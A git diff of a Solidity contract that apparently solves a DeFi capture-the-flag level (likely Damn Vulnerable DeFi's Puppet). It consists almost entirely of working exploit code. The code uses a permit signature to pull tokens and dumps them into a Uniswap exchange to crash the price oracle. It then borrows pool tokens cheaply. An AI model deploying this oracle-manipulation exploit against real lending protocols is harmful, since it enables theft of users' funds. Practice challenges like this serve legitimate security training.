@@ -2,22 +2,8 @@
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/utils/Address.sol";
-import "hardhat/console.sol";
 
-interface IUniswap {
-    function tokenToEthSwapInput(
-        uint256 tokensSold,
-        uint256 minEth,
-        uint256 deadline
-    ) external returns (uint256);
-
-    function ethToTokenSwapInput(
-        uint256 minTokens,
-        uint256 deadline
-    ) external payable returns (uint256);
-}
-
-contract Attack {
+contract AttackPuppet {
     using Address for address;
 
     address private tokenAddress;
@@ -34,19 +20,21 @@ contract Attack {
         uint8 _v,
         bytes32 _r,
         bytes32 _s
-    ) {
+    ) payable {
         tokenAddress = _tokenAdress;
         poolAddress = _poolAddress;
         swapAddress = _swapAddress;
         v = _v;
         r = _r;
         s = _s;
-    }
 
-    function attack(uint tokenAmount) external payable {
-        //transfer token
+        (, bytes memory data) = tokenAddress.staticcall(
+            abi.encodeWithSignature("balanceOf(address)", msg.sender)
+        );
+
+        uint tokenAmount = abi.decode(data, (uint256));
         uint deadline = type(uint).max;
-
+        //approve
         tokenAddress.functionCall(
             abi.encodeWithSignature(
                 "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
@@ -59,9 +47,7 @@ contract Attack {
                 s
             )
         );
-
-        console.log("permit done");
-
+        //transfer
         tokenAddress.functionCall(
             abi.encodeWithSignature(
                 "transferFrom(address,address,uint256)",
@@ -70,7 +56,6 @@ contract Attack {
                 tokenAmount
             )
         );
-        console.log("transfer done ");
 
         tokenAddress.functionCall(
             abi.encodeWithSignature(
@@ -79,26 +64,23 @@ contract Attack {
                 type(uint256).max
             )
         );
-        console.log("approve done");
-        //swap token to eth
-
-        // swapAddress.functionCall(
-        //     abi.encodeWithSignature(
-        //         "tokenToEthSwapInput(uint256,uint256,uint256)",
-        //         tokenAmount,
-        //         1,
-        //         deadline
-        //     )
-        // );
-        IUniswap(swapAddress).tokenToEthSwapInput(
-            tokenAmount,
-            1,
-            block.timestamp + 300
+        //swap
+        swapAddress.functionCall(
+            abi.encodeWithSignature(
+                "tokenToEthSwapInput(uint256,uint256,uint256)",
+                tokenAmount,
+                1,
+                deadline
+            )
         );
-        console.log("swap done");
-        //borrow token
-        poolAddress.functionCall(
-            abi.encodeWithSignature("borrow", 10000 * 10 ** 18, msg.sender)
+        //borrow
+        poolAddress.functionCallWithValue(
+            abi.encodeWithSignature(
+                "borrow(uint256,address)",
+                100000 * 10 ** 18,
+                msg.sender
+            ),
+            msg.value
         );
     }
 }
